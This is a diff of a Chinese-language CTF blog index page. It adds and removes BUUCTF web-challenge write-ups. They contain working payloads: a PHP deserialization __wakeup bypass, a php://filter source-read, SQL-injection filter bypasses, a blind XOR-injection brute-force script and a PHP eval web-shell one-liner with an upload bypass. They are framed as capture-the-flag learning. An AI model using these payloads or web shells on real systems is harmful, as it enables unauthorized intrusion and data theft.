@@ -282,6 +282,327 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/" itemprop="url">BUUCTF-极客大挑战2019 PHP</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-04T10:49:16+08:00">
+                2020-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h1><p>打开题目 得到提示备份了网站<br>所以考虑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php.bak   失败</span><br><span class="line">www.tar  失败</span><br><span class="line">www.zip  成功</span><br></pre></td></tr></table></figure>
+<p>下载到源码后 先查看一下index.php<br>得知用了反序列化的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &apos;class.php&apos;;</span><br><span class="line">    $select = $_GET[&apos;select&apos;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来根据包含 查看class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据_destruct（）函数  得知this-&gt;password==100  this-&gt;username==admin时  输出flag</p>
+<p>随意在后面添加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new Name(&apos;admin&apos;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+<p>启动本地PHP环境  访问一下新的class.php<br>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;Syc&#123;dog_dog_dog_dog&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里不会了 看了一下WP<br>知识点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以加上加%00</span><br><span class="line"></span><br><span class="line">将Name后面的2改为3 是为了绕过__wakeup()  使其username不被覆盖</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>学完JAVA之后 总算对反序列化这玩意 有点概念了  题不算太难 但是挺有意思的  开始我的反序列化之旅</p>
+<p>看了WP之后 得知还有用python提交的  更简便  等以后我会更新一下python脚本的方法</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/" itemprop="url">BUUCTF-极客大挑战 2019 Secret</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-04T10:20:49+08:00">
+                2020-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Archive_room.php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/0.png" alt="avatar"><br>点击SECRET</p>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
+<p>通过抓包确实得到一个action.php的文件<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/2.png" alt="avatar"></p>
+<p>放到Reapter中 发包  得到文件secr3t.php </p>
+<p>访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>审计之后 构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=flag.php</span><br></pre></td></tr></table></figure>
+<p>发现不太行</p>
+<p>使用伪协议读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到base64  解码得到flag</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/BUUCTF-RoarCTF2019-Easy-Java/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -827,9 +1148,9 @@
         
           
             <h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/***/union/***/select#  得知select被过滤了</span><br><span class="line">1/****/union/***/select/***/table_schema/***/table_name/***/column/***/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/**/union/**/select#  得知select被过滤了</span><br><span class="line">1/**/union/**/select/**/table_schema/**/table_name/**/column/**/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
 <p>最后得知过滤掉了select和空格</p>
-<p>这里有很多个方法 用/****/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
+<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
 <p>再构造payload:</p>
 <pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
 <pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
@@ -1282,9 +1603,9 @@
         
           
             <h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>打开竟然是个403</p>
-<p>用bp抓包<br>访问一下index.php<br>![avatar](/images/hgame/code world/0.png)</p>
+<p>用bp抓包<br>访问一下index.php<br><img src="/images/hgame/codeworld/0.png" alt="avatar"></p>
 <p>发现405错误<br><a href="https://www.jianshu.com/p/dd7315428462" target="_blank" rel="noopener">https://www.jianshu.com/p/dd7315428462</a></p>
-<p>所以更改为POST请求<br>![avatar](/images/hgame/code world/1.png)</p>
+<p>所以更改为POST请求<br><img src="/images/hgame/codeworld/1.png" alt="avatar"></p>
 <p>提示要求通过URL计算两个数相加为10</p>
 <p>所以直接URL：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=1+9</span><br></pre></td></tr></table></figure>
@@ -1484,326 +1805,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/BUUCTF-Hack-World/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="diao-diao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diao-diao-UPUP">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/25/BUUCTF-Hack-World/" itemprop="url">BUUCTF-Hack World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-25T10:30:22+08:00">
-                2020-01-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>打开环境 题目提示是Php 和 sql注入<br>所以先按常规的SQL来测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1 一句骚话</span><br><span class="line">2 一句骚话</span><br><span class="line">1&apos; bool(false)</span><br><span class="line">1&apos;# SQL Injection Checked.</span><br></pre></td></tr></table></figure>
-<p>尝试一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：and、or、updatexml被过滤</span><br><span class="line">bool注入和time注入：and、or被过滤</span><br><span class="line">可以通过fuzz测试（模糊测试），发现哪些字符被过滤了。length为482的，全都是被过滤的。</span><br></pre></td></tr></table></figure>
-<p>这里没啥 思路了 但是通过bool(false)  可以判断应该是布尔盲注把 </p>
-<p>看看WP<br>这里考的是异或注入：<br>1^1=0</p>
-<p>1^0=1</p>
-<p>另外还学到了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用/*!union*/可以绕过对union的过滤  但是这题不能用 先存着</span><br></pre></td></tr></table></figure>
-
-<p>由于不会写脚本 所以找了个大师傅的二分脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://a5b5ef4b-d1ce-48aa-a3cf-31243ef82374.node3.buuoj.cn/index.php&quot;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;id&quot; : &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    l = 33</span><br><span class="line">    r =130</span><br><span class="line">    mid = (l+r)&gt;&gt;1</span><br><span class="line">    while(l&lt;r):</span><br><span class="line">        payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid)</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        if &quot;Hello&quot; in html.text:</span><br><span class="line">            l = mid+1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;1</span><br><span class="line">    if(chr(mid)==&quot; &quot;):</span><br><span class="line">        break</span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(&quot;flag: &quot; ,result)</span><br></pre></td></tr></table></figure>
-
-
-<p>得到flag</p>
-<p>不会写脚本 好多题都没法做 唉</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/BUUCTF-CheckIn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="diao-diao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diao-diao-UPUP">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/25/BUUCTF-CheckIn/" itemprop="url">BUUCTF-CheckIn</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-25T09:25:29+08:00">
-                2020-01-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>打开环境看到是一个上传的界面 难道是一句话木马</p>
-<p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
-<p>所以尝试在.php后加一个空格 再.png 成功上传</p>
-<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_POST[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
-<ol>
-<li><p>.user.ini文件 <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
-</li>
-<li><p>GIF89a 图片头文件欺骗 <a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">https://blog.csdn.net/piaolankeke/article/details/5872876</a></p>
-</li>
-</ol>
-<p>接下来就是上传了<br><img src="/images/BUUCTF/CheckIn/0.png" alt="avatar"></p>
-<p><img src="/images/BUUCTF/CheckIn/1.png" alt="avatar"></p>
-<p>接下来用菜刀getshell</p>
-<p>得到flag</p>
-<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_GET[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>URL：<br>?a=system(“cat /flag”);</p>
